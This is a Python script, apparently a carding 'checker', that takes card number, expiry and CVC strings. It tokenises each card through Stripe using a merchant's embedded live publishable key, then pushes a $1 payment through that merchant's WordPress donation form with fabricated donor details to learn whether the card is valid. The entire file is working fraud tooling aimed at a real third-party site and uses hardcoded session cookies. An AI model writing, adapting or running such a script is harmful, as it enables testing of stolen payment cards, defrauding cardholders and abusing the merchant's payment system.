import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F2ddc5912fa%3B+stripe-js-v3%2F2ddc5912fa%3B+card-element&referrer=https%3A%2F%2Floveaprisoner.com&time_on_page=95693&key=pk_live_51JIGi9Fh7Zzb7IxvKHDKPfhqQpsyEcGAN4xRSjSN1MLCdQy91izooxlLjxQQJphHmhCMI3lFLY0Lvig6JCDSJ5G000ytPlehTg'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'pvc_visits[0]': '1738064634b14305',
	    '__stripe_mid': '4f189af3-5911-4c31-8679-d1d72134acf9954893',
	    '__stripe_sid': '47903b1a-2428-49ee-bf8a-493393439f05704684',
	}
	
	headers = {
	    'authority': 'loveaprisoner.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'pvc_visits[0]=1738064634b14305; __stripe_mid=4f189af3-5911-4c31-8679-d1d72134acf9954893; __stripe_sid=47903b1a-2428-49ee-bf8a-493393439f05704684',
	    'origin': 'https://loveaprisoner.com',
	    'referer': 'https://loveaprisoner.com/payment/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1737978329018',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=14305&_fluentform_13_fluentformnonce=aa320f71ef&_wp_http_referer=%2Fpayment%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_text=1&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '13',
	}
	
	r2 = requests.post(
	    'https://loveaprisoner.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
